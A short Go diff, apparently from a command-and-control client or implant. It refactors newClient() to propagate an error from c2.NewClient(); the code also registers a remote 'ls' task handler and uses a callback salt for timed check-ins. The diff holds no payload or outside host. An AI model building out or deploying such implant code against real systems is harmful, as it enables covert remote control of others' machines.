@@ -20,7 +20,9 @@ func main() {
 	if err := config.Initialize(); err != nil {
 		log.Fatalf("failed to initialize config: %v", err)
 	}
-	client = newClient()
+	if err := newClient(); err != nil {
+		log.Fatalf("could not create new client: %v", err)
+	}
 
 	tickSalt := config.C.CallbackSalt
 	r := rand.New(rand.NewSource(time.Now().Unix()))
@@ -37,14 +39,17 @@ func main() {
 	}
 }
 
-func newClient() *c2.Client {
-	client = c2.NewClient()
-
+func newClient() error {
+	var err error
+	client, err = c2.NewClient()
+	if err != nil {
+		return err
+	}
 	router := c2.NewRouter()
 	router.HandleFunc(tasks.OpLS, tasks.CmdLS)
 
 	client.SetRouter(router)
-	return client
+	return nil
 }
 
 func run(registration *transport.Registration) error {
